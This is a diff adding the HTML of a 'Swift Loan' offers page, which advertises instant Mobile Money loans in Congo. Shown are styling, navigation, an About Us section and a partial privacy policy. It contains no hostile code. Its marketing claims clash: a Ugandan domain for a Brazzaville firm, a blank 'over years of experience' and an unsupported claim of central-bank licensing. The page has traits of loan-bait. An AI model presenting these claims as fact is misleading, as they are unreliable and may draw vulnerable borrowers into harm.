@@ -1,0 +1,3414 @@
+<!DOCTYPE html>
+
+<html lang="fr-CG">
+ 
+
+<head>
+
+    <meta charset="UTF-8">
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <title>Loan Offers | Swift Loan - Apply for emergency loans in Congo via Mobile Money</title>
+
+    <meta name="description" content="Check your eligibility for instant loans with Swift Loan. Quick eligibility check and instant approval for emergency financial needs in Congo.">
+
+    <!-- Standard favicon -->
+<link rel="icon" type="image/png" href="swiftloan-logo.png">
+
+<!-- High-resolution icons for Chrome & Android -->
+<link rel="icon" sizes="192x192" href="swiftloan-logo.png">
+<link rel="icon" sizes="256x256" href="swiftloan-logo.png">
+<link rel="icon" sizes="512x512" href="swiftloan-logo.png">
+
+<!-- Shortcut icon (for older browsers) -->
+<link rel="shortcut icon" href="swiftloan-logo.png">
+
+<!-- Apple devices (iPhone/iPad) -->
+<link rel="apple-touch-icon" href="swiftloan-logo.png">
+
+    <!-- Open Graph Tags -->
+
+    <meta property="og:title" content="Swift Loan Offers - Instant Mobile Loans in Congo">
+
+    <meta property="og:description" content="Get instant loans up to 1,292,146 XAF via Mobile Money. Quick approval, no collateral needed. Check your eligibility now.">
+
+    <meta property="og:type" content="website">
+
+    <meta property="og:url" content="https://swiftloan.ug/offers.html">
+
+    
+
+    <!-- Schema.org structured data -->
+
+    <script type="application/ld+json">
+
+    {
+
+        "@context": "http://schema.org",
+
+        "@type": "FinancialService",
+
+        "name": "Swift Loan",
+
+        "alternateName": "Apply for quick online Mobile Money loans. Instant application for emergency with Swift Loan",
+
+        "description": "Online lender Swift Loan provides instant mobile loans for everyone. Quick borrow money in Congo with Mobile Money integration.",
+
+        "url": "https://swiftloan.ug",
+
+        "telephone": "0709-029-000",
+
+        "address": {
+
+            "@type": "PostalAddress",
+
+            "addressCountry": "CG",
+
+            "addressLocality": "Brazzaville"
+
+        }
+
+    }
+
+    </script>
+
+
+
+    <!-- Tailwind CSS CDN -->
+
+    <script src="https://cdn.tailwindcss.com"></script>
+
+    <script>
+
+        tailwind.config = {
+
+            theme: {
+
+                extend: {
+
+                    colors: {
+
+                        primary: '#FF6B00',
+
+                        'primary-dark': '#CC5500',
+
+                        'primary-light': '#FFF4ED'
+
+                    }
+
+                }
+
+            }
+
+        }
+
+    </script>
+
+    
+
+    <!-- Google Fonts -->
+
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+
+    
+
+    <!-- Feather Icons -->
+
+    <script src="https://unpkg.com/feather-icons@4.29.0/dist/feather.min.js"></script>
+
+    
+
+    <style>
+
+        html {
+
+            scroll-behavior: smooth;
+
+        }
+
+        
+
+        body {
+
+            font-family: 'Inter', sans-serif;
+
+        }
+
+        
+
+        .swift-primary { color: #FF6B00; }
+
+        .swift-primary-bg { background-color: #FF6B00; }
+
+        .swift-primary-hover:hover { background-color: #CC5500; }
+
+        .swift-primary-light { background-color: #FFF4ED; }
+
+        
+
+        .gradient-hero {
+
+            background: linear-gradient(135deg, #FFF4ED 0%, #ffffff 100%);
+
+        }
+
+        
+
+        .shadow-swift {
+
+            box-shadow: 0 10px 25px -5px rgba(255, 107, 0, 0.1), 0 10px 10px -5px rgba(255, 107, 0, 0.04);
+
+        }
+
+        
+
+        .transition-swift {
+
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+
+        }
+
+        
+
+        /* Animations */
+
+        @keyframes tickerScroll {
+
+            0% { transform: translateX(0); }
+
+            100% { transform: translateX(-100%); }
+
+        }
+
+        
+
+        @keyframes bounce {
+
+            0%, 100% { transform: translateY(0); }
+
+            50% { transform: translateY(5px); }
+
+        }
+
+        
+
+        @keyframes fadeInUp {
+
+            from {
+
+                opacity: 0;
+
+                transform: translateY(30px);
+
+            }
+
+            to {
+
+                opacity: 1;
+
+                transform: translateY(0);
+
+            }
+
+        }
+
+        
+
+        @keyframes confetti-fall {
+
+            0% {
+
+                transform: translateY(-100vh) rotate(0deg);
+
+                opacity: 1;
+
+            }
+
+            100% {
+
+                transform: translateY(100vh) rotate(360deg);
+
+                opacity: 0;
+
+            }
+
+        }
+
+        
+
+        @keyframes pulse {
+
+            0%, 100% { opacity: 1; }
+
+            50% { opacity: 0.5; }
+
+        }
+
+        
+
+        @keyframes spin {
+
+            0% { transform: rotate(0deg); }
+
+            100% { transform: rotate(360deg); }
+
+        }
+
+        
+
+        @keyframes shake {
+
+            0%, 100% { transform: translateX(0); }
+
+            25% { transform: translateX(-5px); }
+
+            75% { transform: translateX(5px); }
+
+        }
+
+        
+
+        /* Loading dots animation */
+        @keyframes loadingDots {
+            0%, 20% { content: '.'; }
+            40% { content: '..'; }
+            60%, 100% { content: '...'; }
+        }
+
+        .loading-text::after {
+            content: '';
+            animation: loadingDots 1.5s infinite;
+        }
+
+        /* Enhanced Loan Card Animations */
+
+        .loan-card {
+
+            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+
+            animation: fadeInUp 0.6s ease-out;
+
+            transform-origin: center;
+
+            position: relative;
+
+            overflow: hidden;
+            
+            display: none;
+
+        }
+
+        
+
+        .loan-card::before {
+
+            content: '';
+
+            position: absolute;
+
+            top: 0;
+
+            left: -100%;
+
+            width: 100%;
+
+            height: 100%;
+
+            background: linear-gradient(90deg, transparent, rgba(255, 107, 0, 0.1), transparent);
+
+            transition: left 0.6s;
+
+            z-index: 1;
+
+        }
+
+        
+
+        .loan-card:hover::before {
+
+            left: 100%;
+
+        }
+
+        
+
+        .loan-card:hover {
+    transform: translateY(-12px) scale(1.03);
+    box-shadow: 0 30px 60px -12px rgba(255, 107, 0, 0.3),
+                0 15px 30px -12px rgba(255, 107, 0, 0.2);
+    border-color: #FF6B00;
+}
+
+        
+
+        .loan-card:active {
+
+            transform: translateY(-8px) scale(1.01);
+
+            transition: transform 0.1s;
+
+        }
+
+        
+
+        .loan-card:nth-child(1) { animation-delay: 0.1s; }
+
+        .loan-card:nth-child(2) { animation-delay: 0.2s; }
+
+        .loan-card:nth-child(3) { animation-delay: 0.3s; }
+
+        .loan-card:nth-child(4) { animation-delay: 0.4s; }
+
+        .loan-card:nth-child(5) { animation-delay: 0.5s; }
+
+        .loan-card:nth-child(6) { animation-delay: 0.6s; }
+
+        
+
+        /* Enhanced button animation */
+
+        .select-offer-btn {
+
+            position: relative;
+
+            overflow: hidden;
+
+            z-index: 2;
+
+        }
+
+        
+
+        .select-offer-btn::before {
+
+            content: '';
+
+            position: absolute;
+
+            top: 50%;
+
+            left: 50%;
+
+            width: 0;
+
+            height: 0;
+
+            background: rgba(255, 255, 255, 0.2);
+
+            border-radius: 50%;
+
+            transform: translate(-50%, -50%);
+
+            transition: width 0.6s, height 0.6s;
+
+            z-index: -1;
+
+        }
+
+        
+
+        .select-offer-btn:hover::before {
+
+            width: 300px;
+
+            height: 300px;
+
+        }
+
+        
+
+        /* Pulse animation for cards */
+
+        @keyframes cardPulse {
+
+            0% { box-shadow: 0 10px 25px -5px rgba(255, 107, 0, 0.1); }
+
+            50% { box-shadow: 0 15px 35px -5px rgba(255, 107, 0, 0.2); }
+
+            100% { box-shadow: 0 10px 25px -5px rgba(255, 107, 0, 0.1); }
+
+        }
+
+        
+
+        .loan-card:focus-within {
+
+            animation: cardPulse 2s infinite;
+
+        }
+
+        
+
+        /* Ticker */
+
+        #ticker-content {
+
+            animation: tickerScroll 120s linear infinite;
+
+            white-space: nowrap;
+
+        }
+
+        
+
+        .ticker-time {
+
+            color: #059669;
+
+            font-weight: 600;
+
+            margin-right: 8px;
+
+        }
+
+        
+
+        /* Modal styles - FIXED FOR FULL VISIBILITY */
+
+        .modal-overlay {
+
+            backdrop-filter: blur(4px);
+
+            background-color: rgba(0, 0, 0, 0.5);
+
+        }
+
+        
+
+        .modal-content {
+
+            max-height: 95vh;
+
+            overflow-y: auto;
+
+        }
+
+        
+
+        /* Phone input styles */
+
+        .phone-input {
+
+            border: 2px solid #e2e8f0;
+
+            transition: border-color 0.3s ease;
+
+        }
+
+        
+
+        .phone-input:focus {
+
+            border-color: #FF6B00;
+
+            outline: none;
+
+            box-shadow: 0 0 0 3px rgba(255, 107, 0, 0.1);
+
+        }
+
+        
+
+        .phone-input.error {
+
+            border-color: #ef4444;
+
+        }
+
+        
+
+        .phone-input.valid {
+
+            border-color: #10b981;
+
+        }
+
+        
+
+        /* Processing animation */
+
+        .processing-animation {
+
+            animation: pulse 1.5s ease-in-out infinite;
+
+        }
+
+        
+
+        /* Terms checkbox custom styling */
+
+        .custom-checkbox {
+
+            appearance: none;
+
+            width: 1.5rem;
+
+            height: 1.5rem;
+
+            border: 2px solid #d1d5db;
+
+            border-radius: 0.375rem;
+
+            background-color: white;
+
+            cursor: pointer;
+
+            position: relative;
+
+            transition: all 0.3s ease;
+
+            flex-shrink: 0;
+
+        }
+
+        
+
+        .custom-checkbox:hover {
+
+            border-color: #FF6B00;
+
+            transform: scale(1.05);
+
+        }
+
+        
+
+        .custom-checkbox:checked {
+
+            background-color: #FF6B00;
+
+            border-color: #FF6B00;
+
+            transform: scale(1.1);
+
+        }
+
+        
+
+        .custom-checkbox:checked::after {
+
+            content: '✓';
+
+            position: absolute;
+
+            top: 50%;
+
+            left: 50%;
+
+            transform: translate(-50%, -50%);
+
+            color: white;
+
+            font-size: 0.875rem;
+
+            font-weight: bold;
+
+        }
+
+        
+
+        .custom-checkbox:focus {
+
+            outline: none;
+
+            box-shadow: 0 0 0 3px rgba(255, 107, 0, 0.2);
+
+        }
+
+        
+
+        .custom-checkbox.error {
+
+            border-color: #ef4444;
+
+            animation: shake 0.5s ease-in-out;
+
+        }
+
+        
+
+        /* Button loading animation */
+
+        .button-loading {
+
+            position: relative;
+
+            color: transparent !important;
+
+        }
+
+        
+
+        .button-loading::after {
+
+            content: '';
+
+            position: absolute;
+
+            width: 20px;
+
+            height: 20px;
+
+            top: 50%;
+
+            left: 50%;
+
+            margin-left: -10px;
+
+            margin-top: -10px;
+
+            border: 2px solid transparent;
+
+            border-top-color: #ffffff;
+
+            border-radius: 50%;
+
+            animation: spin 1s linear infinite;
+
+        }
+
+        
+
+        /* Welcome popup styles - FIXED FOR FULL VISIBILITY */
+
+        .welcome-popup {
+
+            backdrop-filter: blur(8px);
+
+            background-color: rgba(0, 0, 0, 0.6);
+
+        }
+
+        
+
+        /* Confetti styles */
+
+        .confetti {
+
+            position: fixed;
+
+            width: 10px;
+
+            height: 10px;
+
+            background-color: #f39c12;
+
+            animation: confetti-fall linear infinite;
+
+            z-index: 9999;
+
+        }
+
+        
+
+        .confetti:nth-child(odd) {
+
+            background-color: #e74c3c;
+
+            width: 8px;
+
+            height: 8px;
+
+            animation-duration: 3s;
+
+        }
+
+        
+
+        .confetti:nth-child(even) {
+
+            background-color: #3498db;
+
+            width: 6px;
+
+            height: 6px;
+
+            animation-duration: 2.5s;
+
+        }
+
+        
+
+        .confetti:nth-child(3n) {
+
+            background-color: #2ecc71;
+
+            width: 12px;
+
+            height: 12px;
+
+            animation-duration: 3.5s;
+
+        }
+
+        
+
+        .confetti:nth-child(4n) {
+
+            background-color: #9b59b6;
+
+            width: 7px;
+
+            height: 7px;
+
+            animation-duration: 2.8s;
+
+        }
+
+        
+
+        /* Mobile responsiveness - IMPROVED FOR POPUPS */
+
+        @media (max-width: 768px) {
+
+            .hero-title {
+
+                font-size: 2rem;
+
+                line-height: 1.2;
+
+            }
+
+            
+
+            .hero-description {
+
+                font-size: 1rem;
+
+            }
+
+        
+
+            .modal-content {
+
+                margin: 0.5rem;
+
+                max-width: calc(100vw - 1rem);
+
+                max-height: 95vh;
+
+            }
+
+        
+
+            .loan-card:hover {
+
+                transform: translateY(-6px) scale(1.02);
+
+                box-shadow: 0 20px 40px -12px rgba(255, 107, 0, 0.25);
+
+            }
+
+        
+
+            .loan-card::before {
+
+                display: none;
+
+            }
+            
+            /* Fix welcome popup on mobile */
+            #welcomePopup .bg-white {
+                max-height: 90vh;
+                overflow-y: auto;
+                margin: 0.5rem;
+            }
+            
+            /* Fix loan modal on mobile */
+            #loanModal .modal-content {
+                max-height: 95vh;
+                margin: 0.5rem;
+            }
+
+        }
+
+        
+
+        @media (max-width: 640px) {
+
+            .progress-indicator {
+
+                flex-direction: column;
+
+                gap: 1rem;
+
+                align-items: center;
+
+            }
+
+            
+
+            .progress-bar-container {
+
+                order: 2;
+
+                width: 100%;
+
+                max-width: 200px;
+
+            }
+
+        }
+
+        
+
+        /* Monthly payment highlight */
+
+        .monthly-payment-info {
+
+            border-left: 4px solid #FF6B00;
+
+            background: linear-gradient(90deg, #f8fafc 0%, #FFF4ED 100%);
+
+        }
+   /* Red strip overlay for not qualified offers */
+.not-qualified {
+  position: relative;
+  pointer-events: none;
+  opacity: 0.6;
+}
+
+.not-qualified::after {
+  content: "NOT QUALIFIED YET";
+  position: absolute;
+  top: 40%;
+  left: -30%;
+  width: 160%;
+  text-align: center;
+  transform: rotate(-20deg);
+  font-size: 2rem;
+  font-weight: 900;
+  letter-spacing: 2px;
+  color: white;
+  background: rgba(239, 68, 68, 0.95);
+  padding: 0.75rem 0;
+  box-shadow: 0 4px 12px rgba(0,0,0,0.3);
+  text-transform: uppercase;
+}
+  #progressFill {
+  transition: width 0.2s ease;
+}
+ @keyframes rotatePause {
+  0%   { transform: rotate(0deg); }
+  40%  { transform: rotate(360deg); }
+  60%  { transform: rotate(360deg); }
+  100% { transform: rotate(0deg); }
+}
+
+.rotate-pause {
+  animation: rotatePause 4s ease-in-out infinite;
+}
+   
+
+
+        /* ===== STYLES FROM INDEX.HTML ===== */
+        :root {
+            --primary-orange: #FF6B00;
+            --primary-blue: #001F5C;
+            --light-gray: #F5F5F5;
+            --text-dark: #333;
+            --white: #FFFFFF;
+        }
+
+        /* Header - COMPACT */
+        header {
+            background: var(--white);
+            padding: 0.5rem 5%;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        .header-content {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            max-width: 1400px;
+            margin: 0 auto;
+        }
+
+        .logo-section {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .logo-img {
+            width: 40px;
+            height: 40px;
+            object-fit: contain;
+        }
+
+        .logo-text-container {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .logo-main {
+            font-size: 1.2rem;
+            font-weight: bold;
+            color: var(--primary-blue);
+            line-height: 1.2;
+        }
+
+        .logo-main span {
+            color: var(--primary-orange);
+        }
+
+        .logo-tagline {
+            font-size: 0.5rem;
+            color: var(--primary-orange);
+            letter-spacing: 0.5px;
+        }
+
+        .header-actions {
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+        }
+
+        .icon-btn {
+            position: relative;
+            background: none;
+            border: none;
+            cursor: pointer;
+            padding: 8px;
+            border-radius: 50%;
+            transition: 0.3s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .icon-btn:hover {
+            background: var(--light-gray);
+        }
+
+        .icon-btn svg {
+            width: 24px;
+            height: 24px;
+            fill: var(--primary-blue);
+        }
+
+        .notification-dot {
+            position: absolute;
+            top: 6px;
+            right: 6px;
+            width: 10px;
+            height: 10px;
+            background: #ff0000;
+            border-radius: 50%;
+            border: 2px solid var(--white);
+            animation: notificationPulse 2s infinite;
+        }
+
+        @keyframes notificationPulse {
+            0%, 100% { box-shadow: 0 0 0 0 rgba(255, 0, 0, 0.7); }
+            50% { box-shadow: 0 0 0 6px rgba(255, 0, 0, 0); }
+        }
+
+        .notification-dropdown {
+            position: absolute;
+            top: 70px;
+            right: 5%;
+            width: 350px;
+            background: var(--white);
+            border-radius: 10px;
+            box-shadow: 0 5px 25px rgba(0,0,0,0.2);
+            opacity: 0;
+            visibility: hidden;
+            transform: translateY(-10px);
+            transition: all 0.3s ease;
+            z-index: 1001;
+        }
+
+        .notification-dropdown.active {
+            opacity: 1;
+            visibility: visible;
+            transform: translateY(0);
+        }
+
+        .notification-header {
+            padding: 1rem 1.5rem;
+            border-bottom: 1px solid var(--light-gray);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .notification-header h3 {
+            color: var(--primary-blue);
+            font-size: 1.1rem;
+            margin: 0;
+        }
+
+        .mark-read-btn {
+            background: none;
+            border: none;
+            color: var(--primary-orange);
+            font-size: 0.85rem;
+            cursor: pointer;
+            padding: 0.3rem 0.6rem;
+            border-radius: 4px;
+            transition: 0.3s;
+        }
+
+        .mark-read-btn:hover {
+            background: rgba(255,107,0,0.1);
+        }
+
+        .notification-item {
+            padding: 1rem 1.5rem;
+            border-bottom: 1px solid var(--light-gray);
+            cursor: pointer;
+            transition: 0.3s;
+            background: rgba(255,107,0,0.05);
+        }
+
+        .notification-item:hover {
+            background: var(--light-gray);
+        }
+
+        .notification-item-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-start;
+            margin-bottom: 0.3rem;
+        }
+
+        .notification-title {
+            font-weight: 600;
+            color: var(--primary-blue);
+            font-size: 0.95rem;
+        }
+
+        .notification-time {
+            font-size: 0.75rem;
+            color: #666;
+        }
+
+        .notification-message {
+            font-size: 0.85rem;
+            color: var(--text-dark);
+            line-height: 1.4;
+        }
+
+        /* Hamburger Menu */
+        .hamburger {
+            cursor: pointer;
+            display: flex;
+            flex-direction: column;
+            gap: 5px;
+            z-index: 101;
+            padding: 10px;
+        }
+
+        .hamburger span {
+            width: 30px;
+            height: 3px;
+            background: var(--primary-blue);
+            border-radius: 3px;
+            transition: 0.3s;
+        }
+
+        .hamburger.active span:nth-child(1) {
+            transform: rotate(45deg) translate(8px, 8px);
+        }
+
+        .hamburger.active span:nth-child(2) {
+            opacity: 0;
+        }
+
+        .hamburger.active span:nth-child(3) {
+            transform: rotate(-45deg) translate(7px, -7px);
+        }
+
+        /* Sidebar Menu */
+        .sidebar {
+            position: fixed;
+            top: 0;
+            right: -100%;
+            width: 300px;
+            height: 100vh;
+            background: var(--primary-blue);
+            box-shadow: -5px 0 15px rgba(0,0,0,0.3);
+            transition: right 0.4s cubic-bezier(0.68, -0.55, 0.27, 1.55);
+            z-index: 1000;
+            overflow-y: auto;
+        }
+
+        .sidebar.active {
+            right: 0;
+        }
+
+        .sidebar-header {
+            padding: 2rem 1.5rem;
+            background: rgba(255,107,0,0.1);
+            border-bottom: 2px solid var(--primary-orange);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .sidebar-logo {
+            font-size: 1.5rem;
+            font-weight: bold;
+            color: var(--white);
+        }
+
+        .close-btn {
+            background: none;
+            border: none;
+            color: var(--white);
+            font-size: 2rem;
+            cursor: pointer;
+            line-height: 1;
+        }
+
+        .sidebar-menu {
+            list-style: none;
+            padding: 2rem 0;
+            margin: 0;
+        }
+
+        .sidebar-menu li {
+            padding: 0;
+        }
+
+        .sidebar-menu a {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            padding: 1rem 1.5rem;
+            color: var(--white);
+            text-decoration: none;
+            transition: 0.3s;
+            cursor: pointer;
+        }
+
+        .sidebar-menu a:hover {
+            background: rgba(255,107,0,0.2);
+            padding-left: 2rem;
+        }
+
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.5);
+            opacity: 0;
+            visibility: hidden;
+            transition: 0.3s;
+            z-index: 99;
+        }
+
+        .overlay.active {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        /* Footer */
+        footer {
+            background: var(--primary-blue);
+            color: var(--white);
+            padding: 3rem 5% 1rem;
+        }
+
+        .footer-content {
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+
+        .footer-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 2rem;
+            margin-bottom: 2rem;
+        }
+
+        .footer-section h3 {
+            margin-bottom: 1rem;
+            color: var(--primary-orange);
+        }
+
+        .footer-links {
+            list-style: none;
+            padding: 0;
+            margin: 0;
+        }
+
+        .footer-links li {
+            margin-bottom: 0.5rem;
+        }
+
+        .footer-links a {
+            color: var(--white);
+            text-decoration: none;
+            transition: 0.3s;
+            cursor: pointer;
+        }
+
+        .footer-links a:hover {
+            color: var(--primary-orange);
+        }
+
+        .contact-info {
+            display: flex;
+            flex-direction: column;
+            gap: 0.5rem;
+        }
+
+        .contact-item {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .contact-item a {
+            color: var(--white);
+            text-decoration: none;
+        }
+
+        .contact-item a:hover {
+            color: var(--primary-orange);
+        }
+
+        .footer-bottom {
+            text-align: center;
+            padding-top: 2rem;
+            border-top: 1px solid rgba(255,255,255,0.2);
+        }
+
+        @media (max-width: 768px) {
+            header { padding: 0.3rem 3%; }
+            .logo-img { width: 32px; height: 32px; }
+            .logo-main { font-size: 1rem; }
+            .logo-tagline { font-size: 0.4rem; display: none; }
+            .logo-section { gap: 6px; }
+            .sidebar { width: 280px; }
+            .notification-dropdown { width: 90%; right: 5%; }
+            .header-actions { gap: 0.3rem; }
+            .icon-btn { padding: 4px; }
+            .icon-btn svg { width: 20px; height: 20px; }
+            .hamburger span { width: 24px; height: 2px; }
+        }
+
+        /* Page Modal Styles */
+        .page-modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100vh;
+            background: var(--white);
+            z-index: 2000;
+            overflow-y: auto;
+            transform: translateY(100%);
+            transition: transform 0.4s ease;
+        }
+
+        .page-modal.active {
+            transform: translateY(0);
+        }
+
+        .page-header {
+            background: var(--primary-blue);
+            color: var(--white);
+            padding: 1.5rem 5%;
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+            position: sticky;
+            top: 0;
+            z-index: 10;
+        }
+
+        .back-btn {
+            background: none;
+            border: none;
+            color: var(--white);
+            font-size: 1.5rem;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            padding: 0.5rem;
+        }
+
+        .back-btn:hover {
+            color: var(--primary-orange);
+        }
+
+        .page-content {
+            max-width: 1000px;
+            margin: 0 auto;
+            padding: 3rem 5%;
+        }
+
+        .page-content h1 {
+            color: var(--primary-blue);
+            margin-bottom: 1rem;
+            font-size: 2.5rem;
+        }
+
+        .page-content h2 {
+            color: var(--primary-blue);
+            margin-top: 2rem;
+            margin-bottom: 1rem;
+            font-size: 1.8rem;
+        }
+
+        .page-content h3 {
+            color: var(--primary-orange);
+            margin-top: 1.5rem;
+            margin-bottom: 0.5rem;
+        }
+
+        .page-content p {
+            margin-bottom: 1rem;
+            line-height: 1.8;
+        }
+
+        .page-content ul, .page-content ol {
+            margin-left: 2rem;
+            margin-bottom: 1rem;
+        }
+
+        .page-content li {
+            margin-bottom: 0.5rem;
+        }
+
+        /* Notification Animations */
+        @keyframes slideInLeft {
+            from {
+                transform: translateX(-120%);
+                opacity: 0;
+            }
+            to {
+                transform: translateX(0);
+                opacity: 1;
+            }
+        }
+        
+        @keyframes slideOutLeft {
+            from {
+                transform: translateX(0);
+                opacity: 1;
+            }
+            to {
+                transform: translateX(-120%);
+                opacity: 0;
+            }
+        }
+        
+        .notification-enter {
+            animation: slideInLeft 0.6s cubic-bezier(0.4, 0, 0.2, 1) forwards;
+        }
+        
+        .notification-exit {
+            animation: slideOutLeft 0.5s cubic-bezier(0.4, 0, 0.2, 1) forwards;
+        }
+    </style>
+
+ <!-- Brevo Conversations {literal} -->
+<script>
+    (function(d, w, c) {
+        w.BrevoConversationsID = '67cfe70069e9058aa30db4b2';
+        w[c] = w[c] || function() {
+            (w[c].q = w[c].q || []).push(arguments);
+        };
+        var s = d.createElement('script');
+        s.async = true;
+        s.src = 'https://conversations-widget.brevo.com/brevo-conversations.js';
+        if (d.head) d.head.appendChild(s);
+    })(document, window, 'BrevoConversations');
+</script>
+<!-- /Brevo Conversations {/literal} -->
+
+</head>
+
+<body class="bg-white text-gray-800">
+
+    <!-- Header -->
+
+    <!-- Header -->
+    <header>
+        <div class="header-content">
+            <div class="logo-section">
+                <img src="swiftloan-logo.png" alt="Swift Loan Limited Logo" class="logo-img">
+                <div class="logo-text-container">
+                    <div class="logo-main">Swift <span>Loan</span> Limited</div>
+                    <div class="logo-tagline">EMPOWERING BUSINESS THROUGH FINANCE</div>
+                </div>
+            
+              </div>
+              <div class="header-actions">
+                <button class="icon-btn" id="notificationBtn" title="Notifications">
+                    <svg viewBox="0 0 24 24">
+                        <path d="M12,22A2,2 0 0,1 10,20H14A2,2 0 0,1 12,22M18,16V11C18,7.93 16.36,5.36 13.5,4.68V4A1.5,1.5 0 0,0 12,2.5A1.5,1.5 0 0,0 10.5,4V4.68C7.63,5.36 6,7.92 6,11V16L4,18V19H20V18L18,16M12,6A5,5 0 0,1 17,11V17H7V11A5,5 0 0,1 12,6Z"/>
+                    </svg>
+                    <span class="notification-dot-new" id="notificationDot"></span>
+                </button>
+                <div class="hamburger" id="hamburger">
+                    <span></span>
+                    <span></span>
+                    <span></span>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <!-- Notification Dropdown -->
+    <div class="notification-dropdown" id="notificationDropdown">
+        <div class="notification-header">
+            <h3>Notifications</h3>
+            <button class="mark-read-btn" id="markAllReadBtn">Mark all read</button>
+        </div>
+        <div id="notificationList">
+            <div class="notification-item" id="notification1">
+                <div class="notification-item-header">
+                    <span class="notification-title">Welcome to Swift Loan!</span>
+                    <span class="notification-time">Just now</span>
+                </div>
+                <p class="notification-message">
+                    Get started with your first loan today! Apply now and access instant funds via Mobile Money.
+                </p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Sidebar Menu -->
+    <div class="overlay" id="overlay"></div>
+    <aside class="sidebar" id="sidebar">
+        <div class="sidebar-header">
+            <div class="sidebar-logo">Menu</div>
+            <button class="close-btn" id="closeSidebar">&times;</button>
+        </div>
+        <ul class="sidebar-menu">
+            <li><a href="index.html">Home</a></li>
+            <li><a onclick="openPage('about')">About Us</a></li>
+            <li><a href="eligibility.html">Apply for Loan</a></li>
+            <li><a onclick="openPage('services')">Our Services</a></li>
+            <li><a onclick="openPage('loan-rules')">Loan Rules</a></li>
+            <li><a onclick="openPage('promotions')">Promotions</a></li>
+            <li><a href="index.html#faq">FAQs</a></li>
+            <li><a onclick="openPage('privacy')">Privacy Policy</a></li>
+            <li><a onclick="openPage('terms')">Terms & Conditions</a></li>
+            <li><a onclick="openPage('cookies')">Cookie Settings</a></li>
+            <li><a href="#contact">Contact Us</a></li>
+        </ul>
+    </aside>
+
+    <!-- Page Modals -->
+    <!-- About Us Page -->
+    <div class="page-modal" id="page-about">
+        <div class="page-header">
+            <button class="back-btn" onclick="closePage('about')">
+                <span>←</span> Back
+            </button>
+            <h2>About Us</h2>
+        </div>
+        <div class="page-content">
+            <h1>About Swift Loan Limited</h1>
+            <p>Swift Loan Limited is a leading microfinance institution in Congo, dedicated to providing quick and accessible financial solutions to individuals and small businesses across the country. Since our establishment, we have been committed to empowering Congolese through innovative lending services.</p>
+            
+            <h2>Our Mission</h2>
+            <p>To provide fast, reliable, and accessible financial solutions that empower individuals and businesses to achieve their goals and improve their quality of life.</p>
+            
+            <h2>Our Vision</h2>
+            <p>To be Congo's most trusted and customer-centric microfinance institution, transforming lives through financial inclusion and innovative lending solutions.</p>
+            
+            <h2>Our Values</h2>
+            <ul>
+                <li><strong>Integrity:</strong> We operate with transparency and honesty in all our dealings.</li>
+                <li><strong>Customer Focus:</strong> Our customers are at the heart of everything we do.</li>
+                <li><strong>Innovation:</strong> We continuously improve our services through technology and innovation.</li>
+                <li><strong>Responsibility:</strong> We practice responsible lending and ensure our customers can afford their loans.</li>
+                <li><strong>Excellence:</strong> We strive for excellence in service delivery and customer satisfaction.</li>
+            </ul>
+            
+            <h2>Why Choose Us?</h2>
+            <p>With over years of experience in the microfinance sector, Swift Loan Limited has helped thousands of Congolese access quick financial assistance. We understand the urgency of your needs and have streamlined our processes to ensure you get funds when you need them most.</p>
+            
+            <h2>Our Commitment</h2>
+            <p>We are committed to responsible lending practices, data protection, and ensuring our services remain affordable and accessible to all qualifying Congolese. We are fully licensed and regulated by the Central Bank of Congo.</p>
+        </div>
+    </div>
+
+    <!-- Privacy Policy Page -->
+    <div class="page-modal" id="page-privacy">
+        <div class="page-header">
+            <button class="back-btn" onclick="closePage('privacy')">
+                <span>←</span> Back
+            </button>
+            <h2>Privacy Policy</h2>
+        </div>
+        <div class="page-content">
+            <h1>Privacy Policy</h1>
+            <p><strong>Last Updated: November 2025</strong></p>
+            
+            <h2>1. Introduction</h2>
+            <p>Swift Loan Limited ("we," "our," or "us") is committed to protecting your privacy. This Privacy Policy explains how we collect, use, disclose, and safeguard your information when you use our services.</p>
+            
+            <h2>2. Information We Collect</h2>
+            <h3>Personal Information</h3>
+            <ul>
+                <li>Full name and date of birth</li>
+                <li>National ID number</li>
+                <li>Contact information (phone number, email, address)</li>
+                <li>Employment and income information</li>
+                <li>Bank account and Mobile Money details</li>
+                <li>Credit history and financial information</li>
+            </ul>
+            
+            <h3>Automatically Collected Information</h3>
+            <ul>
+                <li>Device information and IP address</li>
+                <li>Browser type and operating system</li>
+                <li>Usage data and analytics</li>
+                <li>Location data (with your permission)</li>
+            </ul>
+            
+            <h2>3. How We Use Your Information</h2>
+            <p>We use your information to:</p>
+            <ul>
+                <li>Process and evaluate loan applications</li>
+                <li>Verify your identity and prevent fraud</li>
+                <li>Communicate with you about your account</li>
+                <li>Improve our services and user experience</li>
+                <li>Comply with legal and regulatory requirements</li>
+                <li>Conduct credit checks and risk assessments</li>
+            </ul>
+            
+            <h2>4. Information Sharing</h2>
+            <p>We may share your information with:</p>
+            <ul>
